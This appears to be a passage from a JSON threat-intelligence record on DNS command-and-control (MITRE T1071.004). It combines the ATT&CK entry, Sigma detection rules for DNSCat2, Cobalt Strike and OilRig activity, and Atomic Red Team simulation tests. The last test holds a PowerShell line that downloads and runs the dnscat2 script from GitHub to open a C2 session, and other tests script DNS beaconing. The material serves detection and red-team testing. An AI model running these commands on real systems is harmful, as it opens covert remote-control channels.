+                            "raw": "{'x_mitre_platforms': ['Linux', 'macOS', 'Windows'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['Jan Petrov, Citi', 'Chris Heald'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'type': 'attack-pattern', 'id': 'attack-pattern--1996eef1-ced3-4d7f-bf94-33298cabbf72', 'created': '2020-03-15T16:27:31.768Z', 'x_mitre_version': '1.1', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1071.004', 'url': 'https://attack.mitre.org/techniques/T1071/004'}, {'source_name': 'Medium DnsTunneling', 'url': 'https://medium.com/@galolbardes/learn-how-easy-is-to-bypass-firewalls-using-dns-tunneling-and-also-how-to-block-it-3ed652f4a000', 'description': 'Galobardes, R. (2018, October 30). Learn how easy is to bypass firewalls using DNS tunneling (and also how to block it). Retrieved March 15, 2020.'}, {'source_name': 'University of Birmingham C2', 'url': 'https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf', 'description': 'Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.'}, {'source_name': 'PAN DNS Tunneling', 'url': 'https://www.paloaltonetworks.com/cyberpedia/what-is-dns-tunneling', 'description': 'Palo Alto Networks. (n.d.). What Is DNS Tunneling?. Retrieved March 15, 2020.'}], 'x_mitre_deprecated': False, 'revoked': False, 'description': 'Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \\n\\nThe DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.(Citation: PAN DNS Tunneling)(Citation: Medium DnsTunneling) ', 'modified': '2022-06-17T13:52:03.232Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'name': 'DNS', 'x_mitre_detection': 'Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)\\n\\nMonitor for DNS traffic to/from known-bad or suspicious domains.', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'command-and-control'}], 'x_mitre_is_subtechnique': True, 'x_mitre_data_sources': ['Network Traffic: Network Traffic Content', 'Network Traffic: Network Traffic Flow'], 'x_mitre_attack_spec_version': '2.1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5'}",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "4153a907-2451-4e4f-a578-c52bb6881432",
+                        "lookup_data": {
+                            "description": "Detects suspicious DNS queries using base64 encoding",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2018/05/10\ndescription: Detects suspicious DNS queries using base64 encoding\ndetection:\n  condition: selection\n  selection:\n    query|contains: ==.\nfalsepositives:\n- Unknown\nid: 4153a907-2451-4e4f-a578-c52bb6881432\nlevel: medium\nlogsource:\n  category: dns\nmodified: 2022/10/09\nreferences:\n- https://github.com/krmaxwell/dns-exfiltration\nstatus: test\ntags:\n- attack.exfiltration\n- attack.t1048.003\n- attack.command_and_control\n- attack.t1071.004\ntitle: Suspicious DNS Query with B64 Encoded String\n",
+                            "sigma:id": "4153a907-2451-4e4f-a578-c52bb6881432",
+                            "title": "Suspicious DNS Query with B64 Encoded String",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "b11d75d6-d7c1-11ea-87d0-0242ac130003",
+                        "lookup_data": {
+                            "description": "The PowerShell implementation of DNSCat2 calls nslookup to craft queries. Counting nslookup processes spawned by PowerShell will show hundreds or thousands of instances if PS DNSCat2 is active locally.",
+                            "raw": "author: Cian Heasley\ndate: 2020/08/08\ndescription: The PowerShell implementation of DNSCat2 calls nslookup to craft queries.\n  Counting nslookup processes spawned by PowerShell will show hundreds or thousands\n  of instances if PS DNSCat2 is active locally.\ndetection:\n  condition: selection | count(Image) by ParentImage > 100\n  selection:\n    CommandLine|endswith: \\nslookup.exe\n    Image|endswith: \\nslookup.exe\n    ParentImage|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\nfalsepositives:\n- Other powershell scripts that call nslookup.exe\nfields:\n- Image\n- CommandLine\n- ParentImage\nid: b11d75d6-d7c1-11ea-87d0-0242ac130003\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/07/14\nreferences:\n- https://github.com/lukebaggett/dnscat2-powershell\n- https://blu3-team.blogspot.com/2019/08/powershell-dns-c2-notes.html\n- https://ragged-lab.blogspot.com/2020/06/it-is-always-dns-powershell-edition.html\nstatus: test\ntags:\n- attack.command_and_control\n- attack.t1071\n- attack.t1071.004\n- attack.t1001.003\n- attack.t1041\ntitle: DNSCat2 Powershell Implementation Detection Via Process Creation\n",
+                            "sigma:id": "b11d75d6-d7c1-11ea-87d0-0242ac130003",
+                            "title": "DNSCat2 Powershell Implementation Detection Via Process Creation",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "53ba33fd-3a50-4468-a5ef-c583635cfa92",
+                        "lookup_data": {
+                            "description": "Detects Chafer activity attributed to OilRig as reported in Nyotron report in March 2018",
+                            "raw": "author: Florian Roth (Nextron Systems), Markus Neis, Jonhnathan Ribeiro, Daniil Yugoslavskiy,\n  oscd.community\ndate: 2018/03/23\ndescription: Detects Chafer activity attributed to OilRig as reported in Nyotron report\n  in March 2018\ndetection:\n  condition: selection_service\n  selection_service:\n    EventID: 7045\n    Provider_Name: Service Control Manager\n    ServiceName:\n    - SC Scheduled Scan\n    - UpdatMachine\nfalsepositives:\n- Unknown\nid: 53ba33fd-3a50-4468-a5ef-c583635cfa92\nlevel: critical\nlogsource:\n  product: windows\n  service: system\nmodified: 2022/11/27\nreferences:\n- https://nyotron.com/nyotron-discovers-next-generation-oilrig-attacks/\nstatus: experimental\ntags:\n- attack.persistence\n- attack.g0049\n- attack.t1053.005\n- attack.s0111\n- attack.t1543.003\n- attack.defense_evasion\n- attack.t1112\n- attack.command_and_control\n- attack.t1071.004\ntitle: Chafer Activity - System\n",
+                            "sigma:id": "53ba33fd-3a50-4468-a5ef-c583635cfa92",
+                            "title": "Chafer Activity - System",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "f356a9c4-effd-4608-bbf8-408afd5cd006",
+                        "lookup_data": {
+                            "description": "Detects a program that invoked suspicious DNS queries known from Cobalt Strike beacons",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2021/11/09\ndescription: Detects a program that invoked suspicious DNS queries known from Cobalt\n  Strike beacons\ndetection:\n  condition: 1 of selection*\n  selection1:\n    QueryName|startswith:\n    - aaa.stage.\n    - post.1\n  selection2:\n    QueryName|contains: .stage.123456.\nfalsepositives:\n- Unknown\nfields:\n- Image\n- CommandLine\nid: f356a9c4-effd-4608-bbf8-408afd5cd006\nlevel: critical\nlogsource:\n  category: dns_query\n  product: windows\nmodified: 2023/01/16\nreferences:\n- https://www.icebrg.io/blog/footprints-of-fin7-tracking-actor-patterns\n- https://www.sekoia.io/en/hunting-and-detecting-cobalt-strike/\nrelated:\n- id: 0d18728b-f5bf-4381-9dcf-915539fff6c2\n  type: similar\nstatus: test\ntags:\n- attack.command_and_control\n- attack.t1071.004\ntitle: Suspicious Cobalt Strike DNS Beaconing - Sysmon\n",
+                            "sigma:id": "f356a9c4-effd-4608-bbf8-408afd5cd006",
+                            "title": "Suspicious Cobalt Strike DNS Beaconing - Sysmon",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "ce6e34ca-966d-41c9-8d93-5b06c8b97a06",
+                        "lookup_data": {
+                            "description": "Detects Chafer activity attributed to OilRig as reported in Nyotron report in March 2018",
+                            "raw": "author: Florian Roth (Nextron Systems), Markus Neis, Jonhnathan Ribeiro, Daniil Yugoslavskiy,\n  oscd.community\ndate: 2018/03/23\ndescription: Detects Chafer activity attributed to OilRig as reported in Nyotron report\n  in March 2018\ndetection:\n  condition: 1 of selection*\n  selection_process0:\n    CommandLine|contains: \\Service.exe\n    CommandLine|endswith:\n    - i\n    - u\n  selection_process1:\n  - CommandLine|endswith: \\microsoft\\Taskbar\\autoit3.exe\n  - CommandLine|startswith: C:\\wsc.exe\n  selection_process2:\n    Image|contains: \\Windows\\Temp\\DB\\\n    Image|endswith: .exe\n  selection_process3:\n    CommandLine|contains|all:\n    - \\nslookup.exe\n    - -q=TXT\n    ParentImage|contains: \\Autoit\nfalsepositives:\n- Unknown\nid: ce6e34ca-966d-41c9-8d93-5b06c8b97a06\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/09/19\nreferences:\n- https://nyotron.com/nyotron-discovers-next-generation-oilrig-attacks/\nrelated:\n- id: 53ba33fd-3a50-4468-a5ef-c583635cfa92\n  type: derived\nstatus: test\ntags:\n- attack.persistence\n- attack.g0049\n- attack.t1053.005\n- attack.s0111\n- attack.t1543.003\n- attack.defense_evasion\n- attack.t1112\n- attack.command_and_control\n- attack.t1071.004\ntitle: Chafer Activity\n",
+                            "sigma:id": "ce6e34ca-966d-41c9-8d93-5b06c8b97a06",
+                            "title": "Chafer Activity",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "4bcf0465-4b53-4de4-8c53-fcc5f7d04dfc",
+                        "lookup_data": {
+                            "description": "Unwrapping Ursnifs Gifts - The DFIR Report",
+                            "link": "http://www.botvrij.eu/data/feed-osint/4bcf0465-4b53-4de4-8c53-fcc5f7d04dfc.json",
+                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
+                            "timestamp": "1674763285",
+                            "uuid": "4bcf0465-4b53-4de4-8c53-fcc5f7d04dfc",
+                            "_cycat_type": "Item"
+                        }
+                    }
+                ]
+            }
+        },
+        "atomics": [
+            {
+                "attack_technique": "T1071.004",
+                "display_name": "Application Layer Protocol: DNS",
+                "atomic_tests": [
+                    {
+                        "name": "DNS Large Query Volume",
+                        "auto_generated_guid": "1700f5d6-5a44-487b-84de-bc66f507b0a6",
+                        "description": "This test simulates an infected host sending a large volume of DNS queries to a command and control server.\nThe intent of this test is to trigger threshold based detection on the number of DNS queries either from a single source system or to a single targe domain.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "query_type": {
+                                "description": "DNS query type",
+                                "type": "string",
+                                "default": "TXT"
+                            },
+                            "subdomain": {
+                                "description": "Subdomain prepended to the domain name",
+                                "type": "string",
+                                "default": "atomicredteam"
+                            },
+                            "query_volume": {
+                                "description": "Number of DNS queries to send",
+                                "type": "integer",
+                                "default": 1000
+                            },
+                            "domain": {
+                                "description": "Default domain to simulate against",
+                                "type": "string",
+                                "default": "127.0.0.1.nip.io"
+                            }
+                        },
+                        "executor": {
+                            "command": "for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type \"#{query_type}\" \"#{subdomain}-$(Get-Random -Minimum 1 -Maximum 999999).#{domain}\" -QuickTimeout}\n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "DNS Regular Beaconing",
+                        "auto_generated_guid": "3efc144e-1af8-46bb-8ca2-1376bb6db8b6",
+                        "description": "This test simulates an infected host beaconing via DNS queries to a command and control server at regular intervals over time.\nThis behaviour is typical of implants either in an idle state waiting for instructions or configured to use a low query volume over time to evade threshold based detection.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "runtime": {
+                                "description": "Time in minutes to run the simulation",
+                                "type": "integer",
+                                "default": 30
+                            },
+                            "domain": {
+                                "description": "Default domain to simulate against",
+                                "type": "string",
+                                "default": "127.0.0.1.nip.io"
+                            },
+                            "subdomain": {
+                                "description": "Subdomain prepended to the domain name",
+                                "type": "string",
+                                "default": "atomicredteam"
+                            },
+                            "query_type": {
+                                "description": "DNS query type",
+                                "type": "string",
+                                "default": "TXT"
+                            },
+                            "c2_interval": {
+                                "description": "Seconds between C2 requests to the command and control server",
+                                "type": "integer",
+                                "default": 30
+                            },
+                            "c2_jitter": {
+                                "description": "Percentage of jitter to add to the C2 interval to create variance in the times between C2 requests",
+                                "type": "integer",
+                                "default": 20
+                            }
+                        },
+                        "executor": {
+                            "command": "Set-Location \"PathToAtomicsFolder\"\n.\\T1071.004\\src\\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}\n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "DNS Long Domain Query",
+                        "auto_generated_guid": "fef31710-223a-40ee-8462-a396d6b66978",
+                        "description": "This test simulates an infected host returning data to a command and control server using long domain names.\nThe simulation involves sending DNS queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DNS queries for long domain names over a set threshold.\n Upon execution, DNS information about the domain will be displayed for each callout.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "query_type": {
+                                "description": "DNS query type",
+                                "type": "string",
+                                "default": "TXT"
+                            },
+                            "subdomain": {
+                                "description": "Subdomain prepended to the domain name (should be 63 characters to test maximum length)",
+                                "type": "string",
+                                "default": "atomicredteamatomicredteamatomicredteamatomicredteamatomicredte"
+                            },
+                            "domain": {
+                                "description": "Default domain to simulate against",
+                                "type": "string",
+                                "default": "127.0.0.1.nip.io"
+                            }
+                        },
+                        "executor": {
+                            "command": "Set-Location \"PathToAtomicsFolder\"\n.\\T1071.004\\src\\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}\n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "DNS C2",
+                        "auto_generated_guid": "e7bf9802-2e78-4db9-93b5-181b7bcd37d7",
+                        "description": "This will attempt to start a C2 session using the DNS protocol. You will need to have a listener set up and create DNS records prior to executing this command.\nThe following blogs have more information.\n\nhttps://github.com/iagox86/dnscat2\n\nhttps://github.com/lukebaggett/dnscat2-powershell\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "domain": {
+                                "description": "Domain Name configured to use DNS Server where your C2 listener is running",
+                                "type": "string",
+                                "default": "example.com"
+                            },
+                            "server_ip": {
+                                "description": "IP address of DNS server where your C2 listener is running",
+                                "type": "string",
+                                "default": "127.0.0.1"
+                            }
+                        },
+                        "executor": {
+                            "command": "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')\nStart-Dnscat2 -Domain #{domain} -DNSServer #{server_ip}\n",
+                            "name": "powershell"
+                        }
+                    }
+                ]
+            }
+        ]
+    },
+    "timestamp": "2025-02-28 12:25:44"
+}
